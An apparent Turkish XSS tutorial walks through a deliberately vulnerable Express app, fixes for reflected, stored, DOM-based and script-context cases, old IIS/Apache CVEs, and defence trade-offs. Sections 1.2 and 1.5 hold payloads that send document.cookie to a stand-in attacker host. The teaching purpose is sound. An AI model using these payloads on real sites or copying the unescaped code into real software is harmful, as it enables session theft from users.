# Cross-Site Scripting (XSS) — Derin Dalış

Bu metin, XSS'i özet düzeyinde değil, kodun içine girerek ele alır. Amaç eğitim ve savunmadır: mekanizmayı satır satır anlamak, gerçek dünyada nasıl göründüğünü görmek, savunma seçeneklerinin takaslarını tartmak ve geliştiricilerin/savunmacıların düştüğü tuzakları kataloglamak. Örnekler gerçek, çalışır koddur; payload'lar `alert()` ve zararsız `fetch` seviyesinde tutulmuştur, çünkü amaç canlı bir saldırı reçetesi değil, sınırın nerede kaybolduğunu göstermektir.

---

## 1. Çözümlü yürüyüş

Somut bir senaryo üzerinden gidelim: küçük bir Node.js/Express uygulaması, kullanıcıların not bırakabildiği basit bir "mesaj panosu". Reflected bir arama, stored bir yorum ve DOM-based bir istemci parçası içeriyor. Üçünü de zafiyetli halinden düzeltilmiş haline taşıyacağız.

### 1.1 Zafiyetli sunucu kodu (Express + basit template)

```javascript
const express = require("express");
const app = express();
app.use(express.urlencoded({ extended: true }));

// Bellekte tutulan basit "veritabanı"
const yorumlar = [];

// --- Reflected: arama sonucu geri yansıtılıyor ---
app.get("/ara", (req, res) => {
  const q = req.query.q || "";
  res.send(`
    <h1>Arama</h1>
    <p>"${q}" için sonuçlar bulunamadı.</p>
    <form action="/ara"><input name="q" value="${q}"><button>Ara</button></form>
  `);
});

// --- Stored: yorum kaydediliyor, sonra herkese gösteriliyor ---
app.post("/yorum", (req, res) => {
  yorumlar.push({ ad: req.body.ad, metin: req.body.metin });
  res.redirect("/panogenel");
});

app.get("/panogenel", (req, res) => {
  const liste = yorumlar
    .map((y) => `<li><b>${y.ad}</b>: ${y.metin}</li>`)
    .join("");
  res.send(`<h1>Pano</h1><ul>${liste}</ul>`);
});

app.listen(3000);
```

Bu kod, JavaScript template literal'leri ile HTML üretiyor ve kullanıcı girdisini (`q`, `ad`, `metin`) **hiçbir kaçış uygulamadan** doğrudan HTML'in içine gömüyor. Üç ayrı XSS türü burada mevcut.

### 1.2 Sorun kavramsal olarak nasıl ortaya çıkıyor

`/ara` endpoint'ine bakalım. `q` iki farklı bağlama gömülüyor: bir kez `<p>"..."</p>` içinde (HTML gövde bağlamı), bir kez de `value="..."` içinde (HTML attribute bağlamı). İkisi de kaçışsız.

Saldırgan şu URL'i hazırlarsa:

```
http://site:3000/ara?q=</p><script>fetch('https://saldirgan.example/c?'+document.cookie)</script>
```

sunucunun ürettiği HTML şuna dönüşür:

```html
<p>"</p><script>fetch('https://saldirgan.example/c?'+document.cookie)</script>" için sonuçlar bulunamadı.</p>
```

Tarayıcı bunu ayrıştırırken `<script>` etiketini **veri değil, çalıştırılacak kod** olarak görür. Kritik nokta şudur: sunucu için `q` sadece bir string'di; ama tarayıcının HTML ayrıştırıcısı için `<` karakteri "yeni bir yapı başlıyor" sinyalidir. Veri ile kod arasındaki sınır, tam da bu kaçışsız enjeksiyon anında kaybolur.

Attribute bağlamında ise daha ince bir vektör var. `q` değeri `value="..."` içine giriyor. Saldırgan `" onmouseover="alert(1)` yazarsa, çıktı:

```html
<input name="q" value="" onmouseover="alert(1)">
```

olur — çift tırnak, attribute'ı erkenden kapatıp yeni bir `onmouseover` event handler'ı enjekte etmeye yarar. Yani `<script>` etiketi hiç kullanılmadan da XSS mümkündür. Bu, "sadece `<` ve `>` kaçarsam güvendeyim" yanılgısının neden çöktüğünü gösterir: attribute bağlamında asıl kritik karakter tırnaktır.

`/panogenel` ise stored versiyondur. Saldırgan bir kez `metin` alanına `<img src=x onerror="fetch('https://saldirgan.example/c?'+document.cookie)">` yazıp gönderirse, bu payload veritabanına yazılır ve **panoyu açan her kullanıcının** tarayıcısında çalışır. `<img>` etiketi geçersiz bir kaynağa (`src=x`) işaret ettiği için `onerror` handler'ı tetiklenir. Burada `<script>` yerine `<img onerror>` kullanılması, "script kelimesini filtreledik" savunmasının neden yetersiz olduğunu somutlar.

### 1.3 Düzeltilmiş sunucu kodu

Doğru çözüm, her çıktı noktasında **verinin gireceği bağlama uygun kodlama** yapmaktır. Elle string birleştirmeyi bırakıp otomatik kaçış yapan bir template motoru kullanmak en sağlam yaklaşımdır. Aşağıda hem manuel encoder hem de Nunjucks (otomatik kaçışlı) yaklaşımını gösteriyorum.

Önce, bağlama duyarlı iki ayrı encoder:

```javascript
// HTML gövde bağlamı için
function htmlEncode(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// HTML attribute bağlamı: gövdeyle aynı kaçış yeterli,
// AMA attribute'u DAİMA çift tırnak içine alıyoruz.
const attrEncode = htmlEncode;
```

Not: `&` karakterini **en başta** kaçırmak zorunludur; aksi halde `&lt;` üretirken oluşan `&`'i tekrar kaçırıp `&amp;lt;` (double encoding) hatası yaparsınız. Sıralama önemlidir.

Düzeltilmiş endpoint'ler:

```javascript
app.get("/ara", (req, res) => {
  const q = req.query.q || "";
  res.send(`
    <h1>Arama</h1>
    <p>"${htmlEncode(q)}" için sonuçlar bulunamadı.</p>
    <form action="/ara">
      <input name="q" value="${attrEncode(q)}"><button>Ara</button>
    </form>
  `);
});

app.get("/panogenel", (req, res) => {
  const liste = yorumlar
    .map((y) => `<li><b>${htmlEncode(y.ad)}</b>: ${htmlEncode(y.metin)}</li>`)
    .join("");
  res.send(`<h1>Pano</h1><ul>${liste}</ul>`);
});
```

Artık `q = </p><script>...` girildiğinde çıktı:

```html
<p>"&lt;/p&gt;&lt;script&gt;fetch(...)&lt;/script&gt;" için sonuçlar bulunamadı.</p>
```

olur. Tarayıcı `&lt;` dizisini ekranda `<` karakteri olarak **gösterir** ama onu bir etiket başlangıcı olarak **ayrıştırmaz**. Veri, veri olarak kalır. Attribute vektöründe de `"` karakteri `&quot;` olduğu için tırnak erken kapanmaz.

Kritik uyarı: **veriyi depolarken değil, çıktı anında (render time) kodlayın.** `/yorum` POST handler'ında `htmlEncode` yapmayın; ham veriyi saklayın. Çünkü aynı yorum yarın bir JSON API'den, bir e-postadan veya bir PDF raporundan da çıkabilir ve her bağlam farklı kodlama ister. Depolamada kodlarsanız, veriyi bir kez yanlış bağlama kilitlemiş olursunuz.

Üretimde ise şunu tercih edin — otomatik kaçışlı template motoru:

```javascript
const nunjucks = require("nunjucks");
nunjucks.configure({ autoescape: true });

app.get("/panogenel", (req, res) => {
  res.send(nunjucks.renderString(
    `<h1>Pano</h1><ul>{% for y in yorumlar %}
       <li><b>{{ y.ad }}</b>: {{ y.metin }}</li>
     {% endfor %}</ul>`,
    { yorumlar }
  ));
});
```

`autoescape: true` sayesinde `{{ y.metin }}` içindeki her değer HTML gövde bağlamı için otomatik kaçılır. Bu, "encoder çağırmayı unutma" hatasını yapısal olarak ortadan kaldırır.

### 1.4 DOM-based parça: zafiyetli istemci kodu ve düzeltmesi

Sunucu tarafı tamamen doğru olsa bile istemci tarafında XSS doğabilir. Panonun bir "hoş geldin" başlığı, URL fragment'inden isim okuyor olsun:

```html
<!-- ZAFİYETLİ -->
<div id="selam"></div>
<script>
  var isim = decodeURIComponent(location.hash.substring(1));
  document.getElementById("selam").innerHTML = "Hoş geldin " + isim;
</script>
```

Saldırgan `http://site:3000/#<img src=x onerror=alert(document.cookie)>` verdiğinde, `location.hash` içeriği doğrudan `innerHTML`'e yazılır ve `onerror` çalışır. Burada üç şey dikkat çeker: (1) veri hiç sunucuya gitmez — fragment (`#` sonrası) tarayıcı tarafından sunucuya gönderilmez, dolayısıyla sunucu logları ve WAF bunu **hiç göremez**; (2) `innerHTML` bir HTML ayrıştıran sink'tir; (3) source (`location.hash`) doğrudan sink'e (`innerHTML`) akmaktadır.

Düzeltme: HTML üretmeye ihtiyaç yoksa, HTML ayrıştırmayan bir sink kullanın:

```html
<!-- DÜZELTİLMİŞ -->
<div id="selam"></div>
<script>
  var isim = decodeURIComponent(location.hash.substring(1));
  document.getElementById("selam").textContent = "Hoş geldin " + isim;
</script>
```

`textContent`, atanan değeri **hiçbir zaman HTML olarak yorumlamaz**; `<img ...>` ekranda düz metin olarak görünür. Zengin HTML gerçekten gerekiyorsa, `innerHTML` yerine bir sanitizer'dan geçirin:

```html
<script src="dompurify.min.js"></script>
<script>
  var isim = decodeURIComponent(location.hash.substring(1));
  document.getElementById("selam").innerHTML =
    "Hoş geldin " + DOMPurify.sanitize(isim);
</script>
```

DOMPurify, tarayıcının gerçek ayrıştırıcısını kullanarak tehlikeli etiket/attribute'ları allowlist mantığıyla eler ve mutation XSS'e karşı sürekli güncellenir. Elle regex ile "img etiketini sil" yazmaya kalkmak neredeyse kesinlikle atlatılır.

### 1.5 En zor bağlam: kullanıcı verisini bir `<script>` bloğuna gömmek

Bir bağlam özellikle çok yanlış yapılır: sunucunun, kullanıcı verisini doğrudan bir satır içi `<script>` bloğuna gömmesi. Sık görülen bir örüntü, sunucunun istemciye "başlangıç durumu" (initial state) geçirmesidir:

```javascript
// ZAFİYETLİ — HTML-encode burada işe YARAMAZ
app.get("/profil", (req, res) => {
  const ad = req.query.ad || "";
  res.send(`
    <script>
      var kullanici = { ad: "${ad}" };
      baslat(kullanici);
    </script>
  `);
});
```

Buradaki tuzak şudur: geliştirici "HTML-encode yapayım, güvende olurum" der. Ama `<script>` bloğunun **içi HTML olarak ayrıştırılmaz**; JavaScript olarak ayrıştırılır. Yani `&quot;` gibi HTML entity'leri burada kaçış görevi görmez — tarayıcı `<script>` içinde entity çözmez, `&quot;` düz metin olur ve JS string'i kapatmaz; buna karşılık ham `"` kapatır. Saldırgan `ad` alanına şunu koyar:

```
";fetch('https://saldirgan.example/c?'+document.cookie);//
```

Çıktı:

```html
<script>
  var kullanici = { ad: "";fetch('https://saldirgan.example/c?'+document.cookie);//" };
```

String erken kapanır, `fetch` çalışır, `//` satırın kalanını yorum yapar. Ayrıca daha sinsi bir vektör: veri içinde `</script>` dizisi geçerse — HTML string'in ortasında bile — tarayıcının HTML ayrıştırıcısı script bloğunu **erkenden kapatır**, çünkü ayrıştırıcı JS'i anlamaz, sadece `</script>` metnini arar. Yani `ad = </script><img src=x onerror=alert(1)>` de çalışır.

Doğru çözüm, kullanıcı verisini hiç JS koduna gömmemektir. Veriyi güvenli bir şekilde serileştirip data attribute üzerinden geçirin:

```javascript
// DÜZELTİLMİŞ — veri HTML attribute'ta, JS onu dataset'ten okur
app.get("/profil", (req, res) => {
  const ad = req.query.ad || "";
  res.send(`
    <div id="kok" data-ad="${htmlEncode(ad)}"></div>
    <script>
      var kok = document.getElementById("kok");
      baslat({ ad: kok.dataset.ad });
    </script>
  `);
});
```

Artık `ad`, HTML attribute bağlamına giriyor (orada `htmlEncode` doğru çalışır) ve JS onu `dataset.ad` ile veri olarak okuyor — hiçbir zaman kod olarak ayrıştırılmıyor. Alternatif olarak, JSON gömmek gerekiyorsa, `JSON.stringify` çıktısındaki `<`, `>`, `&`, ` `, ` ` karakterlerini Unicode escape'e çeviren bir "safe JSON" serileştirici kullanın; ham `JSON.stringify` `</script>` sorununu **çözmez**.

---

## 2. Gerçek dünya (CVE ile)

XSS akademik bir kavram değildir; internetin altyapısını oluşturan yazılımlarda onlarca yıldır tekrar tekrar ortaya çıkmıştır. Aşağıdaki gerçek kayıtlar, yukarıdaki üç mekanizmanın (reflected, attribute/mesaj bağlamı, sunucu tarafı yansıtma) sahada nasıl göründüğünü demirler.

**CVE-2000-0746 — "IIS Cross-Site Scripting" zafiyetleri.** Microsoft IIS 4.0 ve 5.0, cross-site scripting saldırılarına karşı doğru koruma sağlamıyordu. Kayıttaki mekanizma, tam da 1. bölümdeki reflected senaryonun kurumsal ölçekteki karşılığıdır: kötü niyetli bir web sitesi operatörü, güvenilen siteye giden bir bağlantıya script gömüyor; sunucu bu script'i bir **hata mesajı** içinde istemciye **quoting (kaçış) yapmadan** geri döndürüyor; istemci de bu script'i güvenilen sitenin bağlamında çalıştırıyor. Burada dikkat çekici olan, zafiyetin uygulama koduna değil, sunucunun **hata sayfası üretim yoluna** yerleşmiş olmasıdır — geliştiricilerin çoğu zaman gözden kaçırdığı bir çıktı noktası. Bu, "her çıktı noktasını, hata sayfaları dahil, kodla" ilkesinin neden var olduğunu gösterir.

**CVE-2000-1104 — IIS zafiyetinin bir varyantı.** Aynı MS00-060 bülteni kapsamında, CVE-2000-0746'nın bir varyantı olarak kayda geçmiştir. Aynı temel kusur (hata mesajında kaçışsız yansıtma) farklı bir vektörle yeniden ortaya çıkmıştır. Bu, XSS'in tipik bir özelliğidir: bir yama belirli bir girdi desenini kapatır, ama kök neden (bağlama uygun kodlama eksikliği) çözülmediği için saldırgan aynı mekanizmayı besleyen başka bir yol bulur. "Karakter bazlı yama" ile "kök neden düzeltmesi" arasındaki farkı bundan iyi anlatan az örnek vardır.

**CVE-2001-0658 — Microsoft ISA Server 2000.** Internet Security and Acceleration Server'da, **geçersiz bir URL** hata mesajında doğru şekilde quote edilmediği için, saldırgan diğer istemcilere script çalıştırtabiliyor veya çerezlerini okuyabiliyordu. Yine aynı desen: kullanıcı kontrollü bir değer (geçersiz URL), bir hata mesajına kaçışsız yansıtılıyor. Bir güvenlik ürününün (ISA bir firewall/proxy ürünüydü) kendisinin XSS'e açık olması, "güvenlik yazılımı yazan da aynı hataya düşer" gerçeğinin altını çizer — XSS bir dikkat meselesi değil, yapısal bir sınır problemidir.

**CVE-2000-1205 — Apache 1.3.0–1.3.11.** Apache'de birden çok XSS vektörü vardı: (1) `printenv.pl` CGI'si çıktısını encode etmiyordu; (2) `ap_send_error_response` ile üretilen varsayılan 404 gibi sayfalar açık bir `charset` eklemiyordu; (3) bazı modüllerin/çekirdeğin ürettiği çeşitli mesajlar. İkinci madde özellikle öğreticidir: sayfa `charset` belirtmediğinde tarayıcı karakter setini kendi **tahmin eder** ve bazı encoding'lerde (örneğin UTF-7) `<` `>` karakterleri farklı byte dizileriyle üretilip filtreleri atlatabilir. Yani XSS savunması bazen sadece kodlamada değil, yanıtın `Content-Type; charset=utf-8` başlığını **açıkça** göndermekte de yatar. Bu üç vektör, tek bir üründe reflected XSS'in kaç farklı çıktı yolundan sızabileceğini gösterir.

Bu kayıtların ortak dersi nettir: XSS'in %90'ı, kullanıcı kontrollü bir değerin bir çıktı noktasına (özellikle hata mesajları ve otomatik üretilen sayfalar) bağlama uygun kodlama yapılmadan konmasından doğar — 1999'da da böyleydi, bugün de.

---

## 3. Karşılaştırma / karar

XSS savunmasında birden çok mekanizma vardır ve hiçbiri tek başına yeterli değildir. Aşağıda seçenekleri ve takaslarını karşılaştırıyorum.

### Çıktı kodlaması (output encoding) vs. girdi doğrulama (input validation)

**Çıktı kodlaması** birincil savunmadır; çünkü XSS bir **çıktı** problemidir — veri, tarayıcı ayrıştırıcısına gelirken bozulur. Kodlamayı çıktıya en yakın noktada, bağlama duyarlı yaptığınızda, verinin nereden geldiği (form, API, import) önemsizleşir. **Girdi doğrulama** ise saldırı yüzeyini daraltan faydalı ama **yetersiz** bir ilk katmandır: "yaş alanı sadece rakam olsun" gibi kısıtlar meşrudur, ama "isim", "adres", "yorum" gibi alanlar meşru olarak `<`, `>`, `&`, `'` içerebilir. Girdiyi tek savunma yaparsanız ya meşru veriyi reddedersiniz ya da kaçınılmaz olarak bir vektör kaçırırsınız. Karar: **her ikisini de kullanın, ama XSS'i çözen çıktı kodlamasıdır.**

### Allowlist (beyaz liste) vs. blocklist (kara liste) sanitizasyon

**Blocklist** ("şu etiketleri/kelimeleri yasakla") yapısal olarak yenik düşer. Saldırgan sonsuz varyasyon üretebilir: `<script>` yerine `<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, büyük/küçük harf karışımı, HTML entity katmanları, alternatif encoding. CVE-2000-1104'te gördüğümüz "varyant" olgusu tam da budur. **Allowlist** ("yalnızca `<b>`, `<i>`, `<a href>` izinli, gerisi elensin") ise tanımlı olanı geçirir, tanımsız her şeyi eler — saldırganın yeni vektörü listede olmadığı için otomatik reddedilir. Karar: **daima allowlist.** Blocklist yalnızca yanlış güven verir.

### Otomatik kaçışlı template motoru vs. elle encoding

**Elle encoding** (1.3'teki `htmlEncode` çağrıları) doğru çalışır ama insani hataya açıktır: tek bir çıktı noktasında encoder çağırmayı unutmak XSS açar, ve kod tabanı büyüdükçe bu kaçınılmazdır. **Otomatik kaçışlı motor** (React JSX, Nunjucks/Jinja2 `autoescape`, Go `html/template`) varsayılan olarak güvenlidir; risk yalnızca bilinçli kaçış-delme noktalarında (`dangerouslySetInnerHTML`, `|safe`, `v-html`, `Html.Raw`) yoğunlaşır ve bu noktalar sayıca az olduğu için denetlenebilir. Karar: **otomatik kaçışlı motoru varsayılan yapın**, elle encoding'i yalnızca motor dışına çıkan kenar durumları için tutun.

### CSP: savunma mı, tek başına çözüm mü?

**CSP** güçlü bir **savunma derinliği** katmanıdır — kodlama başarısız olursa hasarı sınırlar. Katı, nonce tabanlı bir `script-src` politikası, enjekte edilmiş satır içi `<script>`'i tarayıcı düzeyinde engeller. Ama CSP **birincil savunmanın yerini almaz**: yanlış yapılandırılırsa (`unsafe-inline`, gevşek host listeleri, açık JSONP endpoint'leri) kolayca atlatılır ve DOM-based XSS'in bazı biçimlerine (örneğin veri sink'e akışı) hiç dokunmaz. Karar: CSP'yi **ikinci hat** olarak, `strict-dynamic` + nonce ile, `unsafe-inline` olmadan kurun; ama onu tek savunma sanmayın.

### HttpOnly çerez vs. localStorage'da token

Oturum token'ını **`HttpOnly` çerezde** tutarsanız, XSS gerçekleşse bile `document.cookie` token'ı okuyamaz — CVE'lerdeki klasik "çerezi sızdır" saldırısı kırılır. **`localStorage`'da token** tutmak ise XSS'e karşı yapısal olarak daha zayıftır, çünkü `localStorage` her zaman JavaScript'e açıktır. Takas: `HttpOnly` çerez, SPA'larda token'a JS'ten erişim gerektiren mimarileri zorlaştırır; ama güvenlik açısından tercih edilmelidir. Not: `HttpOnly` çerezi çalınmayı engeller ama **session riding**'i (kurbanın tarayıcısından istek yapma) engellemez; yani gerekli ama yeterli değildir.

### Trusted Types: nihai DOM-based savunma

**Trusted Types** (modern tarayıcılar), `innerHTML`/`eval` gibi tehlikeli sink'lere ham string yazılmasını **API düzeyinde** yasaklar; ancak bir "policy"den geçmiş güvenli tipler kabul edilir. Bu, DOM-based XSS'i yapısal olarak keser — geliştirici yanlışlıkla ham veri yazamaz. Takas: eski tarayıcı desteği ve mevcut kod tabanını uyumlu hale getirme maliyeti vardır. Karar: yeni/modern uygulamalarda Trusted Types'ı hedefleyin; DOM-based XSS için elle sink hijyeninden çok daha güvenilirdir.

---

## 4. Hata-modu kataloğu

Geliştiriciler ve savunmacıların XSS'te tekrar tekrar düştüğü tipik hatalar:

1. **Girdi doğrulamaya güvenip çıktı kodlamasını atlamak.** "Formda tehlikeli karakterleri engelledik" düşüncesi, aynı verinin başka bir yoldan (API, toplu import, başka servis) sisteme girmesiyle çöker. Savunma çıktı noktasında olmalı.

2. **Depolama anında kodlama yapmak.** Veriyi kaydederken HTML-encode etmek; sonra aynı veri JSON API, e-posta veya PDF'ten çıkınca ya çift kodlanır ya da yanlış bağlamda kalır. Ham sakla, çıktıda bağlama göre kodla.

3. **Bağlamı karıştırmak.** HTML gövde için doğru olan HTML-encode'u bir `<script>` bloğuna, `href="javascript:"` içine veya bir event handler attribute'una koymak. Kodlama bağlama uymayınca koruma sağlamaz — script bağlamında `&lt;` çalıştırmayı hiç durdurmaz.

4. **Attribute'u tırnaksız bırakmak.** `value=${x}` gibi tırnaksız attribute'ta boşluk bile sınırı bozar; `x=1 onmouseover=alert(1)` tek başına XSS açar. Attribute'ları daima çift tırnak içine alın ve tırnağı kaçırın.

5. **Blocklist / karakter değiştirme.** `<script>` dizgesini silmek veya sadece `<`/`>` kaçırmak; `<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, `javascript:` şeması ve encoding katmanları gibi onlarca alternatifi kaçırır. CVE-2000-1104'teki "varyant" bunun canlı kanıtıdır.

6. **Hata sayfalarını ve otomatik üretilen çıktıları unutmak.** CVE-2000-0746, CVE-2001-0658 ve CVE-2000-1205'in ortak noktası: zafiyet asıl uygulama kodunda değil, **hata mesajı / 404 / geçersiz URL** yollarındaydı. Bu çıktı noktaları da kodlanmalı.

7. **`Content-Type`/`charset` başlığını açıkça göndermemek.** Yanıt karakter setini belirtmezse (CVE-2000-1205), tarayıcı encoding'i tahmin eder ve UTF-7 gibi setlerde filtre atlatılabilir. `Content-Type: text/html; charset=utf-8` başlığını daima açıkça gönderin.

8. **Framework'ün otomatik kaçışını bilinçsizce delmek.** `dangerouslySetInnerHTML`, `v-html`, `|safe`, `Html.Raw`, `innerHTML` — "ben ne yaptığımı biliyorum" sözü verdirir. Bu noktalar kod incelemesinin ve lint kurallarının merkezinde olmalı.

9. **DOM-based XSS'i sunucu savunmasıyla kapatmaya çalışmak.** Fragment (`#`) tabanlı payload sunucuya hiç gitmez; sunucu tarafı WAF, log ve kodlama onu göremez. İstemci tarafı source-to-sink hijyeni şarttır.

10. **Sanitizasyonu elle regex ile yazmak.** HTML ayrıştırma ve mutation XSS o kadar karmaşıktır ki elle temizlik neredeyse kesinlikle atlatılır. DOMPurify gibi olgun, tarayıcı ayrıştırıcısını temel alan kütüphaneler kullanın — ve güncel tutun.

11. **CSP'yi `unsafe-inline`/`unsafe-eval` ile anlamsızlaştırmak.** CSP başlığı eklemek "güvenlik başlığımız var" hissi verir; ama bu iki değer korumanın neredeyse tamamını iptal eder. `unsafe-eval` ayrıca DOM-based `eval` sink'ini açık bırakır.

12. **Token'ı `localStorage`'da tutmak.** `localStorage` her zaman JS'e açıktır; XSS gerçekleşince token doğrudan okunur. Oturum token'ını `HttpOnly` çerezde tutmayı tercih edin.

13. **`postMessage` ve diğer istemci source'larını unutmak.** DOM-based XSS yalnızca `location.hash`'ten gelmez; `postMessage` verisi, `window.name`, `document.referrer` de kullanıcı kontrollüdür ve doğrulanmadan bir sink'e akarsa aynı sonucu verir. `postMessage` dinleyicilerinde `event.origin` kontrolü ve veriyi sink'e ham vermeme kritiktir.

14. **`javascript:` ve `data:` şemalarını URL bağlamında beyaz listelememek.** `<a href="${url}">` içine kullanıcı URL'i konurken şema doğrulanmazsa, `javascript:alert(1)` tıklandığında çalışır. Yalnızca `http`, `https`, `mailto` gibi güvenli şemalara izin verin.

---

## Kapanış

XSS'in çekirdeği tek bir cümledir: veri ile kodun tarayıcı ayrıştırıcısında karışması. Ama bu basit çekirdek, bağlamların çokluğu (HTML gövde, attribute, JS, URL, CSS), tarayıcı ayrıştırıcılarının hoşgörüsü ve mantığın istemciye kayması yüzünden çok yönlü bir tehdide dönüşür. 1999'dan bugüne CVE kayıtları aynı dersi verir: kullanıcı verisini bir çıktı noktasına — özellikle hata sayfalarına — bağlama uygun kodlama yapmadan koymayın. Doğru zihniyet, XSS'i "kötü karakter temizleme" değil, "her veriyi gireceği bağlama uygun biçimde çıktıya verme" problemi olarak görmektir. Bağlama duyarlı kodlamayı birincil savunma, sanitizasyonu zengin HTML için özel araç, CSP ve Trusted Types'ı savunma derinliği, `HttpOnly` çerezi ise sömürünün sonuçlarını daraltan katman olarak konumlandırın.
